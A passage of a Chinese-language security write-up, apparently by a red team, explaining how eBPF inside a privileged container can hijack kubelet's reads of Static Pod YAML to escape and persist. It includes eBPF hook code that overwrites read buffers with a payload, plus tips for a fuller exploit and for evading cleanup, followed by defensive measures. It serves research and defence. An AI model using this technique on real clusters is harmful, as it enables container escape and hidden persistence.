+而文件更新检测是基于 kubelet 维护的 POD Hash 表进行的，配置的更新可以很及时和确切的对 POD 容器进行重建。Static Pod 甚至包含稳定完善的奔溃重启机制，由 kubelet 维护，属于 kubelet 的默认行为无需新加配置。操作系统层的痕迹清理只需删除 Static Pod YAML 文件即可，kubelet 会自动移除关闭运行的恶意容器。同时，对于不了解 Static Pod 的蓝队选手来说，我们需要注意的是，使用 `kubectl delete` 删除恶意容器或使用 `docker stop` 关闭容器都无法完全清除 Static Pod 的恶意进程，kubelet 会守护并重启该 Pod。
+
+eBPF 劫持 kubelet 进行逃逸
+--------------------
+
+劫持 kubelet 仅需要 hook `openat` 、 `read` 、 `close` 三个系统调用。hook 的 eBPF 代码和上面 hook `cron` 几乎一样，但有以下几点不同。
+
+`bpf_get_current_pid_tgid` 获取的是内核调度线程用的 pid，而 kubelet 是多线程程序，因此需要修改根据 pid 过滤系统调用为使用 tgid 来过滤，这里采取简单办法，直接根据程序名过滤：
+
+```
+// ...
+    char comm[TASK_COMM_LEN];
+    bpf_get_current_comm(&comm, sizeof(comm));
+    // executable is not kubelet, return
+    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
+        return 0;
+// ...
+
+```
+
+yaml 不支持多行注释，导致 hook `read` 时，如果原始返回过长，只能将超出我们写的 payload 长度的部分覆盖掉，不过我们可以使用 `bpf_override_return` 来修改 `read` 的返回值，因为 syscall 定义都是可以进行 error injection 的：
+
+```
+#define __SYSCALL_DEFINEx(x, name, ...)                    \
+    // ...
+    asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))    \
+        __attribute__((alias(__stringify(__se_sys##name))));    \
+    ALLOW_ERROR_INJECTION(sys##name, ERRNO);            \
+    // ...
+#endif /* __SYSCALL_DEFINEx */
+
+```
+
+该 helper 需要内核开启 `CONFIG_BPF_KPROBE_OVERRIDE` 选项，并且使用了该 helper 会导致被 hook 函数不会真正执行，我们 hook `read` 时需要在第二次 `read` 时返回 0 保证，不然 kubelet 第二次调用 `read` 时会读取真正的 yaml 文件内容。
+
+完整的 hook `read` 返回代码如下：
+
+```
+SEC("kretprobe/__x64_sys_read")
+int kretprobe_sys_read(struct pt_regs *ctx)
+{
+    char comm[TASK_COMM_LEN];
+    bpf_get_current_comm(&comm, sizeof(comm));
+    // executable is not kubelet, return
+    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
+        return 0;
+    if (read_buf == 0)
+        return 0;
+    if (written)
+    {
+        written = 0;
+        bpf_override_return(ctx, 0);
+        read_buf = 0;
+        return 0;
+    }
+    bpf_probe_write_user(read_buf, payload, PAYLOAD_LEN);
+    bpf_override_return(ctx, PAYLOAD_LEN);
+    read_buf = 0;
+    written = 1;
+    return 0;
+}
+
+```
+
+最终效果：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDayAxlr4tSdJXbn0ibaFyS1E16q5rgOEhSMYly9j5Ee1XIGXHkR3h6STg/640?wx_fmt=png)
+
+### 改进  
+
+本节展示的示例仅仅是一个 PoC，想获取在实战环境下更完善的 exploit 我们还会需要以下改进：
+
+• 上述示例的前提条件为知道对应 yaml 路径，因此在实战环境下，想写出更稳定的 exploit 需要先 hook 对应系统调用，得到 `kubelet` 相应的 Static Pod 配置文件路径 •PoC 的利用方式是覆盖原有的 yaml 文件内容，这会导致原来的 Pod 被删除，更可靠的方式是能实现添加 Pod 配置的方式，不过由于 `kubelet` 使用的是 `filepath.Glob` ，不符合 pattern 的文件路径都会被过滤，不能简单 hook `getdent64` 系统调用来利用
+
+防御措施
+----
+
+从根源上解决，在没有使用 `user namespace` 隔离的情况下，不要赋予容器 `CAP_SYS_ADMIN` 和 `CAP_BPF` 权限，或者 `seccomp` 限制 `bpf` 系统调用。
+
+主动防御可以监控系统 `bpf` 调用和加载 eBPF 程序、map 的情况，在容器内一般不会加载 eBPF 程序，如果成功加载，则可能存在 eBPF 被滥用的情况。
+
+Thanks
+------
+
+感谢腾讯蓝军 lake、小五、振宇等师傅们在成文先后的审核和帮助，是让他们赋予这篇文章更多的光彩。也感谢你读到这里，成文仓促，希望业界大师傅们多指教勘误。
+
+### References
+
+`[1]` What is eBPF: _https://ebpf.io/what-is-ebpf_  
+`[2]` BPF and XDP Reference Guide: _https://docs.cilium.io/en/stable/bpf/_  
+`[3]` The art of writing eBPF programs: a primer.: _https://sysdig.com/blog/the-art-of-writing-ebpf-programs-a-primer/_  
+`[4]` rewrite-cgroup-devices: _https://github.com/cdk-team/CDK/blob/main/pkg/exploit/rewrite_cgroup_devices.go_  
+`[5]` lxcfs-rw: _https://github.com/cdk-team/CDK/blob/main/pkg/exploit/lxcfs_rw.go_  
+`[6]` CDK: an open-sourced container penetration toolkit: _https://github.com/cdk-team/CDK_  
+`[7]` Miscellaneous eBPF Tooling: _https://github.com/nccgroup/ebpf_  
+`[8]` Kernel Pwning with eBPF: a Love Story: _https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story_  
+`[9]` Docker AppArmor default profile: _https://github.com/moby/moby/blob/master/profiles/apparmor/template.go_  
+`[10]` The list of program types and supported helper functions: _https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md#program-types_  
+`[11]` bpf: unprivileged: _https://lwn.net/Articles/660080/_
